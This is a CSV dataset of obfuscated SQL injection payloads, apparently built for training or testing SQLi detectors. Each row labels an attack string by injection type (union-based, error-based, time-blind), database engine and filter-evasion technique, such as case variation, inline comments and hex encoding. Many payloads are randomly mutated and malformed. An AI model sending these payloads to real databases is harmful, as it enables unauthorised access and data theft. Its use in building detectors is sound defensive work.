payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0O0B1%"" ) )) ) +and*ChAR ( (SEleCt (selecT (sElecT (SeLEcT (SELECT 104)))))} ) OR CHAR ( 0X5f ]) ||chAR ( (SeLeCT 0X46) ) ||cHar/*\X*(SelECT~(SeLecT (SeLECT (SELEcT 0x8))))A:F_K:%fyt*/ ( 0X5A ) lIKe REGexp_SubstRING (- repeaT ( RighT ( 'cHar (^ 0x0x24B2 ?) =,(SeLeCt (sElEct 0x7)) () ,0X12a0x0B104F290 ) ,null )| && TrUe && tRUE||0x27Cb not lIKE (sEleCT (SElECt 0x22cb)) anD 5 oR fALSE AND (SELECT 1) --",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0x0X0b10 $"") *){ +])) (/**/:&&* 0b0o12X4x0x146e= And tRuE#( {SelECT!coUNt _(,`* ) froM rDB$fIELdS as/*+~POfbZO9-0b110t-RqP~B4*/T0b0O9o0O0o0X1,RDB$typES{As/**/T0O4B0B1011010,rDb$cOlLATIons\as[T0B0o0x1X9,rdB$FUNCTIONS?aS&t2X2X8[/*eqIRPy}0O0o3X0o5_*/) :>aNd$ (; :( `(;.0B0x0o0X8250 {= 0x4B0b10101000100101101000111010111101110110RN",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0X9' () , ) As ydbT wHere 0x1F84 lIKE 0B1111101111110`and (selEct (SeLeCt,0B1X1A9E)) LIke ] ( sElect CoUNT ( * ) fROm rDB$FIelDs AS t1,RDb$tYPes As t2,RDb$COLlAtIOnS AS t3,rdb$FUNCtiOns,AS-T4 ) anD 0x1 && ""a""=""a"" ANd tRue AND (SELecT (selECT (seLeCt (SELECT (SELECT 1))))) Or (Select 0o0X0) oR falSE or 0x0B10110110C=(sEleCt (SeLEcT (sEleCt (SeLecT 0x182D))))|Or fALse Or (selEct (sElECt 0)) OR False AND True --",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"1' ) ? aS LrIF WHeRe (SeLeCT 8521) %= 0o14575 oR roW ( 0O0x415,7511_ ) > (_ sELECT coUNt ( * :) `,COnCaT/*CJR2;oM'*/ ( 0X6x0d0O6e7aa71,& ( SeLEcT ( elT ( (SElECt 1045) = 0x418,0o3 /**/) ) ) ,0x0x0O0X524a0O6377a31,flo oR ^( rAnd ;( (sELEct (seLECt (sElECt 0x0))) ) !*(seLEcT (seLect 2)) . ) ) )x fROM ( SeleCT 0X2128 unION sEleCT}0x9B1111d0 UNION sELEcT (SELEcT (SELECT (SELECT 3051)))=uNiOn(sElect (SelECt (sELEcT (SELECT (SeLECt 1210)))) () a gRoUP or)6 oR FAlse#By X% ) oR faLSE And tRUE anD ""D`9F"" not=""D`3fb"" AnD:trUe OR ')YwT'!=')ywt' AnD (SeleCt 0x5) oR ""p"" nOt = ""p"" OR 0b0x0}And (SElECt 1) Or falSE or faLSe AND tRue Or faLSE aNd=trUE --@F",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"2o1'And0B0X0o17114 LIKE dbms_UTILItY.SqLId_to_sqLhAsh [( *( chR ( (SelEct (SELEcT 7X71)) ) liKe || cHR ( 0x0b9001111 ') Or cHr ( 0X0X46 )] ||Chr (, 0X0x6A ) ^`oR cHr ( (selEcT (seLEct (SeLecT (SeLEcT (SELECt.(SELect (SeleCt (SeleCt (select (sELeCt (selEcT (seleCt (SElECt (SeLEcT (SELECT 113))))))))))))))) ) oR ( SeLecT (< CASE'wHen ( (sELecT 1X0E4c) LiKE 0X1e0b0X0x4C ) THen (SeLecT;0x2b1) elsE;(SelECT (seLECt 0X0))$End ) | FRoM DUAl> ) OR ChR ( (selECt (sELECt (SElECt (SELecT 0X81)))) ) Or \cHr _( 3o0X9A ]) || CHR ( `(seleCT (seLeCt 0x0b0x0x70)) ) =OR Chr (( 0x78> ) ||cHR; ( 0X63/' 0X7+ */)YcLqFl{C:+hiR*/ ) ) {) anD 'naPi' liKE 'NAPi",unknown,oracle,case_variation|function_alternative|hex_string|scientific_notation,0.11,rule,sqliv5_json,unknown
sELeCT CaSE when 0x15B7 lIke (selEct 0O1551) ThEn`0o0o1&eLsE NulL&END--,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"3 ) `procEDurE`aNaLySE$`( EXtRaCTVaLue (} 0x259B,conCAT? ( 0O7b0X5c,` (: BencHMark ( 0b0b10000111101011001010001000111111100111110101111110000111010001010101000000,md5/**/ ( 0X4B724C75 / ),/**/ ) /**/ ) ) )_ ,0x0o1 ) /**/OR^faLSe And trUE ANd true && TRue AND truE aND True!AND`(SELECT 1)# QN2D",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.44,rule,sqliv5_json,unknown
"0o3'+ ( SELeCT LhTN WHErE (SelECt?(selECT 0x5cC))=0O0x0X9b0O0xcC1a1751d174< and ChaR ( (SElEct (SEleCT (seLeCt[(selEct 0X3f)))) ) / or chAR ( (sElECt 0X1d){ )( oR CHAR[ ( (SelecT (seLECT 0b1311000)) ) or CHAR (~-0X0b111013 ) LIKe reGEXP_SUBsTriNg ({ repEaT ( LEFt ( CRyPt_KEy ( CHar ( 0b0O3B0X10CadC !) OR cHaR+ ( 8O605 {) or /*{=L|%fJQ(.`;]*/CHAR ((_ 0B0b1012011 ), ,nulL <) (,0X0b1001 :) ,(seLECT (seLECT (SeLeCT (sELEct (sELEct (SElEct 0O0X1Dd99a05)))))) )\ ,null; ) )< +'",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0x8o0x9b3b0o2'(| )_*,>) + >aS*USrk*WHeRE (sElEcT~8X5X0B15010b0O0o4)=0B0o0x0O0B8X6b0X0b8X89b0b0O0O0x7o0b180B0b0B1073X0o0B8b0b0Xbb3B4130124]uNIon/*ZS|n[;0HA;gsfPpP8^m ><0b0o6B3!~s4>vz)2Hxp~�za^)Is.7kp<;w++^*/ALl SelECt nuLl,NUlL,Null,null,NUlL,nuLl,nulL,nULl,NULL,NULl--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"SElect]sleeP:/(/ 1O0X5B0X0O0x0x0x0b0B0x0b0X9x0b0B5B10111015/*(SeleCT (seleCT""0))] (SELect (seLecT (sELECT 0x7)))*/ ) ?~AND )( ;? ( (% 'RzJF'_*='/'rZJf",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0O3o1%"" ( ) < ) { oR/*(<0x7i || (SEleCT (seLect (SeleCT (seLeCt 0)))) ANd 1 OR False OR False#4tqg)*/ExTrACTVaLuE: ( 0X506,conCat ( 0x5C,0X0x30257aa72, }( Select /**/ ( ElT` ( 0x379> LIKe (SEleCT 0X0X4fd),0b0x7 ) !) oR FAlSE AND ""0b15B,"" NOt lIKE ""2B,:"" [ and ` (selECt (SelEcT (SELEcT 0x1)))?aND True oR (sEleCt (sElECt 0xCc8)) not LiKE (sELeCT!(SElecT (SELECT 3282))) ANd ""YWKb"" lIkE ""yWKb"" OR (SElEcT (SeLEct (sElect (selEct (sElECT (SELEct 0x3))))))#\ <)[ ,0X6o0X61fA766A71 ) `. ) aNd < (] ( ""%""/*t/T!""Ckb<rK7LqSDEa12*/ LiKE ""5SI]>BsmCpwlk",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1' And (sELect 8X0b0x3f7A7) =/*y>LZ[(SelEct (SelEcT (seleCT 8)))/CU de ~y$ Gle/O)G*/ CTXSyS.dRiThSx.Sn [( (SElEcT 0x0o15453), ;( cHr ( (sElECt 183) )> OR ChR ( (seLECt 0xB6){/) OR chr ( (sElEct 4x96)% ) OR CHr (/**/ 0x8A )' oR ChR ( (SeLect (sEleCt (sEleCt (SeLeCT (SELECT 110))))) )||( seLECt ( &CasE,wHeN (% 6o0b111x0b0X3F2A0x7=9x17A2 ) then (SElect (sELECT 0X1)) ElSe (selECT 0X0X5) EnD ) ""FROm_DUAl ) ||CHr ( (sELEcT 445) )] or :CHr? ( (SeLECt (sELEct 9O149)) ) ""OR CHr *( (seLEcT (sElECt 0x86)) ) || CHR !( (SELECt (seLEct (SELECT 182))) ) or CHr ( 0B0x70 ) ) - ) aNd`'moYb' lIke ^'moYB",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_double_quote
"1%"" .) )+}/**/ <) |OR eLt ( '(SElect(0b0x1880)=(seleCT 0o0B0b0O0X0x0b4B0b0b11000111001100000111101010011000011101000011001111010011110001111100110101111010110110001011111110110110011001),sLEep ( /*I )rt*/(SElEcT (SELecT 0x5)) ) &_ )\ aNd ( ^|( *( ""%"" =(""",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
"0x6%"" `) / /*(SEleCt[(sElect 0X7))?~g~GyT^!xn*/ oR} 0B1b4o9x0O5o4x5b0B0x0B1001001011111010012~; LiKE ;nOT liKE? .Like ( 'aBCdeFG',UppEr~\(& HeX (!~RanDOmbloB {(+ 0b0x1DCd0O0o34324/0o0X3X0B150x0o8x4X0 ~)! ) *& : ) /*J5*kn*cV;N*/) /*o~r ~*}mRtq+D_N+*/""aND[TRUe=/*Y)'&JeS*/ANd 0X0B7X0B1110015121E+Not LIke 0b0x0O0B11O0x9O6X80c3O0x3, .Or ;)FaLSE OR FaLSE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' ) )/*6B; (SelECT (SELECT (SELECT (SELECT (SELECT 8)))))5HGM#*/ ) and (sELEct 0x154f) Like ( sElECT CoUNt ( * ) frOm gEnerAte_seRIES ( 0B0o4,0x0b0X4C4b0x28 ^) ): -anD ([ ( ( 'EfLk' =: 'eFlK",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0O1%' ) _) Or@(sElEcT 0X70e5) = ( selECt couNt ( * ) {frOM GEnERATE_SERiES ( (selECT (seLEct (SELECT (SELECT 1)))),(SEleCt (SElEcT (SELEcT 0x0x0x880F4))) ) ) }and /**/( ( '%' Like '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
0o4 wheRe 0x23dc=(sELect 0x0b1fF4x8) OR sleEP['( &(sElEcT 0x0B101)% )^ OR $falSE Or falSE OR False AND True OR False#Df]Vn&,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"8%"" ) : ) )) ; && sLeep /*tU\5KKn |*/( @0x3X0x0x5 *), anD [(sELECt 0x1AFa) NOt?LiKE""(sElECT~0X70f) or *(sELecT (SeleCT 0xbA2)) nOt lIKE (sElEcT 5b150006101010)?or (selEct 0X0) oR (SeLECT>(SELECT 2123)) nOT lIKe`(seLEct (sElECT 2123)) OR 'R`I~' != 'R`I~' AnD truE Or fALsE anD ""T""!=""T7""#].'D",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_double_quote
"sELECt ?(& caSE WHEn >( (seLeCT 0X04b7) lIkE 0x169a@"") TheN 0X24b1 elsE caSt (< 0x0B8 AS=InT] ) / ( SELeCt](SElECT (SElEct (SELECT (SELECT 0)))) fROm DUaL"" ) & ENd^ ) froM_dUaL--",unknown,oracle,case_variation|hex_string,0.06,rule,sqliv5_json,unknown
"1""\ ) _=WhERe 0XA8E=(selecT 0o0O0Xa8E)+AND 4x0B0b2XC4B /*HSKmK^Q){d*/= DBMs_Pipe.receiVe_MeSsage ( chr (/ 0X0b100C ) OR`chR (/**/;0x0O2O244 ) -: OR ;cHR (? 0X0B1210104^ ) or cHr ( 0x41;:) ,0X6o0X5 ) Or/*iU?](SeLEcT (SELect 0x3))Zq4 */(sELeCt (SELecT (selEct (SeleCt (SeleCT 0XE0e)))))/*iv*/Not lIKE 0xE0X0o0e[Or FALsE~Or ""O9&c""=""o6&cc"" AND TRUE || 0b0XaE7=0xaE8 OR fALSe anD~(SeleCT (SeleCT 0x1588))=(sELeCt (SElECT (SELEcT (SElECt 0o12610))))}--",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_double_quote
"0O7%""`and chAr^ ( (SELect (sEleCt 0X6d)) ,) : or cHaR ( ;0X0B100f{ )@ or chAr\ ( 0O0o0o0X0b0X0XACcD2 ) OR /*AKD) >w&L or FaLSE oR (sElECt (SELECT 1382))=1383 OR faLse OR False#:i!j[*/ChAr ( 0xA ) LIkE\ REGExp_sUBsTrInG ( REPEat (^_rIGhT (}[ChaR ( 0x0b10101111015 ) ',0X0x4 ). ,(selECT (SeLect (SEleCT (SeLeCt (sEleCt (sEleCT (SELeCT (SElecT (SELECT|2001010200))))))))) ) ,NUlL ) oR-0o0 And! /1x0xA0x51 NOt LIke}(SELECt 0B0O0x0o0xAE5) oR (SEleCt (SeleCT 0X192E)) Not liKE 0B0b10700007000100411090100110110007181110110 and (seleCT (sELeCt (SeLect (SeLECT;0X1)))).OR (sElect (SELECT 2015))^NoT liKE 0o0B111010011001 --e",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,numeric
"0b1' ) )`> OR ExTRAcTVaLUe ( (SElEct (seLEcT (SElEcT (sELect (sELeCT (SElECt (seLEcT (SeLEct (SELeCT (SEleCt 1297)))))))))),cOncAt ( 0X7C,0X1175738A71, ( >SeleCT ( ElT (}.(SelEcT*0x0O2521) lIke :(SeleCt 0b90107010001),0X9)_ ) ) ? ) ,0B0x410A667A0X0B100A * ) ) aNd ( `( 'SkDm' LIKE 'skDm",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0b0O0o0b0X5%'&\)?~:AND+3o0o2X3x0x0O6x1o0O6O0x51cf`""liKE DBms_pIpe.reCEIvE_MeSsAge;-(@ Chr@$( {0X50~&) : or _cHR&`( 2X0x0o155 )? )or cHr (/*(sElect-(sElect:(SElECT@0x0B1801O0o7X0o3))).tMd~b:DtRuSu:z -{%+H?hAFS]kXA0O11QqE<m s*/(1X5x17""')]! OR`CHr ""(>+9x0b1011811 !), ,0b0b1x8 [)$ ?and{< (, '%'?'LiKE '",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.06,rule,sqliv5_json,unknown
"0B1%' ); and$TrUE Or/**/"" 0o117""<>"" 58"" and $'e '*nOT'liKe;'e &' Or fAlSE oR faLsE AnD.trUE or/faLSE Or fAlSE oR fALSeAnDTRUe Or fALSe or FaLSe Or fAlSE oR FaLse OR FalSE#!Or (sElECt 0b0o4o0B0X2112)#[lIKe BenChmarK{(( (sEleCT (sELecT 0X0o0B100F5858)),Md9& ( 0x614A0o0b0b0B110101011100110010110010110101101100011011001001010111100001011110101100111000100111111000111110100100010100010110001101 ) ! ) ! }anD -( '%' =@ ';N +(SELECT (SeleCt 0x0)) T^AM%z",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"3%"" ) } oR EXP (/**/~~ ( seLECt *;fRom ( SELect COnCaT ( 0X0X1D8DBaa21, [( \sELECT ( elt (? (SeLecT (seleCT (SELECt 3x182E))) LikE (seLecT 0O0O1x1517),(sElECt 1X9x1) ) ) ) ;,0x317A0X0ffa0o51,0x78? :) % ) x ): )& aNd ( ""%"" LIke """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1"" ) AS fKco wheRE 0o0x0B0X9188B125B2D liKe (SElEcT 0x22Ad){OR ( SELEct (Select (seLeCT (SELecT (sElEcT 0x0O27D5)))) FRoM *( seLeCt coUnt ( * ) ,coNCat[^( 0X9171706A1o0o107, /*?Lu)Sdo?*/( SElecT ( elT ( (sElecT|(sElECt (SElECT 9683))) LikE 0x33D0O5,(selECt 0o1); ,). ); ) _,0x514a0b0b0x0b1011111111A75,fLO Or ( r AND ( 0B0 ) *6o2 ) ). X from INFOrmatioN_SCHemA.CHArActEr_Sets GroUp by and TRUe OR False#x ) A ) \OR FaLsE]--c:]``*]P&(SELecT 3)]%",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1""_) ).< /7ZEI */9x0b0b1111101000 ""ZM*/)< aNd 0X0B1110011010d==|(sELecT'0x1198)--",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"9' oR] (~+selEct 'ZzKX'@wHere_(Select 0b0xcC6) =~0o0o0xcc6 ]/ AND, ;-+0x0b0b0o8X7d9 OR/ (SELECT*(SELECT (SELECT 0))) AND True#lIKe; 8x7d0O6a.=D",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
", ( SEleCt> ( cASe WheN _(` 0b0B11B0b111018100000000010001001001111011000011 < liKe 0O0b0b10000000001011000101110000111000000011110& ) ]THen )(_]SELect CoUnT ( * )) :FROm]SysuseRS [Or fAlsE AND{7080]NOT Like (sEleCt 0x1ba9) && 0X1#as sYs0o0O6,SySusERs{As!Sys8B0o0B1111101001,sYsuSeRs%as SYS0,SysuSeRs)AS.sYs0O10,sYsUsErS]As/**/SYs0o0O0B101,sySUSeRS/*Of?q^X v */As sYs0o0b110,SySuSerS aS)sys0X0X0B111 &) ![ElSe<0xDCb,eND, ).& ) ; 2lNfagu Pb",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"sELect {/*""0b0b0B1{-LM/FACNAO({S}^_&}g1sU,i)F*/( <CAsE`wheN`&]( )8b0x1O0B1010050108105<lIKe)9O22549; )> thEn<(SElECT 0b6O0B0b0O0x9779843b9d))ElSE 0X0B0x3/ [( `SElecT 0B0X0b0 ]) &~enD )[/*'; ^(SELECT 0x4):v*/ ]Or *�LsE*--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0O1'~"") ]AS pFWT WherE 0b0X0B0B111110110111010100000111100011000010100/*Q e`P*/;liKe:<0X0x0X0B0o1F0o106 uNION+All selECT/*6L7}~~?hOGG*/nulL,nUll,nuLl,nUlL,nUll,nulL,null,nUll,NuLl= && (sElEcT:0x1)-or*(sElEct (SELect (selECT 0X10a0))) not likE 0x10A0#0b0b0x0b1010c945VD]0b110111Y",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"8'~ ) /**/ , && $ ( 0b0XbCc\ =/*4y]@(Select[(SeleCT (sELEct (SElEcT[0X0))))<<?m-3So?b!yz`z$e^LWj:53O*/ 0o0B129613901100 :) *0x1a4F &&_ ;(*:'RSkQ' {lIKe, 'rskq",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"3b0b101b0b0b0b0O4 (+)`(/*;/**/\MfLgf@qn ;.uj?Rl0x5a0c?Ctl/(Select (SeLecT 0x0o4)){e' ;~4I2d^bj1*/`) ; * AND ](sElect""8o0x0O1O0o0b4X0Xc0b0B105e)=`*(+&SELeCt CoUNt &( %*&!)<$ FrOm!sYsUsErS oR FAlsE#As SYS0b0O2O1,sySuSeRs*as?sys0b9xa,SysuseRs>as[syS5,SYSuSerS AS@Sys2O0b0b7O144,sYSuSErs%aS.SYs5B20,sYSuseRS[aS`SyS0b156,SySUsers/**/as@SYs5x0o8 )|@,;}aND >* (/ ](@@@0b0X0O0o0X0x1010=0B1010011950550O`",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
0B9'+ ( SELeCt QPaf WHerE 0O15623 liKe (SELect (SelecT 0x9ed1)) OR ( SelEcT * froM ( SelEcT ( SlEEP ( (SELECT (SELECT (SELECT 8))) ) ) { ). YDpU ) ) } +',unknown,mysql,case_variation|hex_string,0.05,rule,sqliv5_json,unknown
"0X1' ): AnD 8XEF0o0O0b0 lIKE BENChMArK+ ( && trUE[anD`0x13D0X3 nOT LIKE( 0B0B1111110901011 oR (SElect 0x0)/*\gkTm*/anD<true AnD$""mHO&""<>""MHo&8""/**/ or fAlsE AnD trUE Or (select (SELEcT 0x390))!=0x390 aNd TRuE Or false#/*osISm0x0O0B0B1011 `W[I*/0X4C0b1010010111110,Md5 @( 0O0X0O0b0b1000111001001101010111010111001111011011111000100001000000001100100111101010000010110000110111 ) ? ) * ;ANd$ (` 'uRxS']= 'URxsZ%T$Pm4q7#pi",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0B0B1010'+ \( seLect+'DRvV' WherE}(SELEct.(SelEcT!0o0B16110101110890))]""= !2B0o5x15f6^and""(sEleCt 0B510111111100)=+ (/**/ sELEcT cOUnT (.<*. ) fROm\DoMAIn.DOMaIns aS T0X8B1,DomaiN.cOLUmns As t0b0xa,DoMaiN.tABLes@as T0x0o4 -) / anD/{TRue(aND>0o0X0O1 aND{"")w"" NoT lIKE "")wS""aNd(SelEct 0x1)>aNd True^oR 0B0 oR (sElECT (sElECT 0x0B1FF0)) NOt Like 0x3o325A<or fALsE/ && TRuE oR (selECt 0X1E09)<>(SELect (sELEct 0x1e69))(&& tRUE oR fALSe OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o0O3', ( SElEcT 0x2* ( -IF ( { /**/( SelecT * FRom (> selEcT coNCAT ( 7X7171206a79, ( selEcT /*JO2Ip>t]N*/( eLT ( (Select 0x25Dd)=0O0x25dd,0x5 ) ) , ) ,0x0x717A367a71,0X0b0x78 /*WI*/) ) ;s ) "", (Select (SElECt 0x753ff7f8bfa4fffa)), (sElECt 0O0B1001110100100101010011011101111111010011111100110101001111010100000000)? )' ) $ )^\",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
1' where/**/0x13c4\ LIKE 0b1001111000100,unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1%"" AnD 0x1091=ConVeRt ( inT, () sElect ChAr ( (SeLEct 0x6f) ) +cHar ( 0x41 ) +cHAR ( 0x74 ) +CHAR ( (SELect 0B1101010); ) +cHaR ( +(SeLecT 0o0X0x5x7b) }) + ( SelecT ( CAse WhEN ( (selEcT 9x2419) LIkE (SELEct (SElECt (SelECT 4249))) ) ThEn ChAr ( (selECt/(SelEcT (seLECt (sEleCT 49)))) ) ElSE CHaR ( (SElECT (SelECT (selEcT (selEcT 40)))), ) eNd ) )` +chAr ("" 0O361 ) +chAR ( 0x7A ) +CHar ^( (sElEct (selEcT (SELECT 129))) ) +CHAR ( (selECT 120) ) +ChAr ( (sELeCT 0X71) &) ) % ) AND ""%"" liKe """,error_based,mssql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"1' )\ & And Row` ( 0o0b1100701011102,0X1D0o2D ) > ( {SELecT counT +( * ) ,COnCaT @( 0X4X3179706a71, ( SeleCt ( elt (] (SEleCT (SElECT 0x1fc9))=(seLEct (SELECt (SelECt 0X165d))),(sElECT~(seLECT 0x1)) ) ) ) >,0B0X719a0b1011111111A0o107,FLO oR ( rAND ( (SELeCt 0B0x0) ) *(SeleCt (SeleCt (SeLECT (SeLEct 0X2))))! |) ) X From* ( SElect 4x15d0O10 uNIon SelECT 0o7351 UNiOn Select 0b111141011011 unION SElECT (Select;0X1fde) ) A gRoUP by X )}",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"9b10. )]<\Or/*`""0b100*/(sEleCT 0o0X5249)/*Lj9P<c~/OBF/3H.*/ LIkE(`BEnCHmark <( <0X6C4B0x0b10111,MD0B101 =(_ 0X0o0o1505D5a4c- ~)*` *) And|True Or]falsE\&AnD~ trUe oR FAlSE}aNd tRuE && TRue#D]\@",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"5 )_/ (&& @(SeLect (SeLECT (SELEct (seleCt}(SElect;(selecT (SELecT 0xeF0b11))))))) LiKE BenCHMaRK -( 4x0o0O0O4c0X4b00,mD0o0x5B901 ( *0X74505642 `) /*>RG l)\`F]*/ ) _",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"2B0x1' )_ And (SELect (SElecT 0X0X1E4C))< LIKe^'dBMS_UTility.sqLId_TO_sQlHASH ( ( cHR ( (sElecT (selEcT (SelECT 113))) )+.||ChR ( (seLeCt (seLECt 113)) )= oR cHr ( +(sEleCt 0X0O0b0x2b) )/*(Select (SELECT 7))|?%t(~ _h*/ ||cHr] ( (SElEct (SeLecT (SELECT 0x1a0))) ) |||chR[ (* (SeleCt (SeLECt (select (SElEcT 0X0o213)))) \)||( sELecT (\ cASe WHeN (^ 0x1744 LiKE <;0b0101001101109 ) THEn (SeleCt (sElEcT (SeLeCt 9))) ELSE (seleCT (SEleCt 0O0)) EnD ) frOM DUAl =) or CHr ,( (sELECT (SEleCT (SELECT 113))) ) ^Or CHR :( /0o0b1111010 )[ oR ChR ( 0B0X02 ) ||cHR (( (SelECt 3X0x7A) ) ||Chr: ( `(SELeCt (SelECT 0xad)) )< ) ) and ( 'NXKp' LIKE 'nxkp",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"7' ) ) ~) pROcEduRE anALYSe ( EXtrAcTvaluE ( 0x205B,conCAt (` 0x5C, (- BenChMark or fAlSe AND (SELECT 1) AND True#( 1X5O11C8x4b0b110X1e,mD0o5 ( 0b0X0B100B874C75 ) ) )( ) ) &,(seLECt 0X1) ); ANd TRUE Or fAlSe;&& tRue OR faLSE Or falseAND(seLECT (sELeCT (SELEct 0X1)))#D7gr&",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
"7%' ) ) ) ANd ( SElECT 0x2* ( If (/**/ ( sElECT * fRoM ( seleCt ConCAt ( 0X7171706a71, ( SELEct ( elt ( (sELEcT 3474) lIke (SeLeCt 3484),0X1 ) ) ;) /**/,0X717A0X2Ffa71,0X78 ) ) S ) , 0B111010100111000110111001111101101110110000101111111111116111010, 0x0B0b10000001001110111001011101010110011111010dCFB7617FFFA ) ) ) && ( ( ( '%' = '",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"7"" )~ . , aND~ . exTraCTvalue ( 0B2x1F33,CoNcAt '(+)0X0O0C,0x0X6d6e79a71, (: SElECT :%( Elt ( :(SELecT (selEct 0X1F2e)) ^LiKe (sElEct (sElEct 3X8B0b1f2E)),(SElect 0O0X0o11) ) )@/*TI1Mqy;_HU&V~iS2eI oMrrt*/ ) ,5x0x2cda667a0o4B1050111. )\{, ); {AnD . (/ ""THKH"" liKE ""ThKH",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
